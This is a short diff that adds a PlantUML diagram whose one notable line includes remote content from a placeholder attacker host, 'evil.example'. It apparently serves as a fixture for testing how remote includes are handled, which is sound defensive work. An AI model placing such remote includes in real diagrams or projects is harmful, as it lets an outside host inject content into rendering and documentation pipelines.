@@ -1,0 +1,4 @@
+@startuml
+!include https://evil.example/x.puml
+Alice -> Bob
+@enduml
